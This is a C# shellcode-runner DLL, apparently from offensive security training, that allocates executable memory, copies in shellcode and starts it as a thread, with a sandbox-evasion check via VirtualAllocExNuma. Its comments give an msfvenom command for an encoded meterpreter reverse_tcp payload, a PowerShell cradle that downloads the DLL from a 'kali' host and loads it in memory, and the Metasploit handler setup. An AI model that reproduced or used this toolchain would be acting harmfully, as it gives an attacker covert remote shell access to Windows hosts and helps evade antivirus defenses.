using System;
using System.Runtime.InteropServices;

namespace Clib1
{
    public class Class1
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr IpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr IpThreadAttributes, uint dwStackSize, IntPtr IpStartAddress, IntPtr IpParameter, uint dwCreationFlags, IntPtr IpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr InHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr InProcess, IntPtr IpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProess();

        public static void runner()
        {
            IntPtr m = VirtualAllocExNuma(GetCurrentProess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0x0);
            if (m == null)
            {
                return;
            }

            byte[] buf = new byte[561] { ...};
            IntPtr a = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, a, 561);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, a, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

// how to run
//
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.42.152 LPORT=443 -f csharp -e x64/zutto_dekiru -o demo.exe
//
// head -10 demo.exe
//
// replace buf =
//
// compile with VS 2019, .NET 4
//
// run powershell
//
// $data = (New-Object System.Net.Webclient).DownloadData('http://kali/Clib1.dll')
// $assem = [System.Reflection.Assembly]::Load($data)
// $class = $assem.GetType('Clib1.Class1')
// $method = $class.GetMethod("runner")
// $method.Invoke(0, $null)
//
// use exploit/multi/handler
// set PAYLOAD windows/x64/meterpreter/reverse_tcp
// set EXITFUNC thread
// set ENABLESTAGEENCODING true
// set AUTOLOADSTDAPI false
// run
// load stdapi in meterpreter
